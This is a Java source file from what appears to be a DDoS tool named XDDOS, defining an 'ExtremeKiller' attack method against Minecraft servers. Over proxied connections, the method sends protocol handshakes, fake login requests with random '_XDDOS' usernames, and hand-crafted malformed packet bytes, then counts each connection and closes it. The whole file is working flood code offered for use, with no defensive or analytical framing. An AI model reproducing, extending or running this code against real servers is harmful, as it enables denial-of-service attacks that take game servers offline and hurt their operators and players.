package XD.XDDOS.methods.impl;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;
import java.security.SecureRandom;
import java.util.concurrent.TimeUnit;

import XD.XDDOS.XDDOS;
import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.helper.RandomUtils;
import XD.XDDOS.utils.packet.Handshake;
import XD.XDDOS.utils.packet.LoginRequest;
import XD.XDDOS.utils.proxy.ProxyLoader;

public class ExtremeKiller
implements IMethod{

    final int a = Integer.parseInt(System.getProperty("len", "25555"));
    private byte[] handshakebytes = (new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2)).getWrappedPacket();


  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshakebytes));
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
    try {
      long seconds = TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis());
      if (seconds % 2L > 0L) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest((new SecureRandom()).nextInt(99999) + "_XDDOS")).getWrappedPacket()));
      } else if (seconds % 3L > 0L) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest((new SecureRandom()).nextInt(99999) + "_XDDOS")).getWrappedPacket()));
        String nick = RandomUtils.randomString(10) + "_XDDOS";
        bbbb.writeBytes(nick);
        bbbb.write(1);
        bbbb.write(-8);
        bbbb.write(-5);
        bbbb.write(-8);
        bbbb.write(-5);
        bbbb.write(2);
        bbbb.write(1);
        bbbb.writeBoolean(true);
      } else if (seconds % 4L > 0L) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest((new SecureRandom()).nextInt(99999) + "_XDDOS")).getWrappedPacket()));
        String nick = "XDDOS";
        bbbb.writeBytes(nick);
        String uuid = "a2xSdioDOANdo92JIdIADc";
        bbbb.write(uuid.length() + nick.length() + 3);
        bbbb.write(2);
        bbbb.write(uuid.length());
        bbbb.writeBytes(uuid);
        bbbb.write(nick.length());
        bbbb.writeBytes(nick);
      } else {
        bbbb.write(15);
        bbbb.write(0);
        bbbb.write(47);
        bbbb.write(9);
        bbbb.writeBytes("localhost");
        bbbb.write(99);
        bbbb.write(223);
        bbbb.write(2);
        String nick = RandomUtils.randomString(14);
        bbbb.write(nick.length() + 2);
        bbbb.write(0);
        bbbb.write(nick.length());
        bbbb.writeBytes(nick);
      }

    } catch (IOException e) {
      e.printStackTrace();
    }
    channel.writeAndFlush(b);
    channel.writeAndFlush(bbbb);
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    channel.close();
  }

}
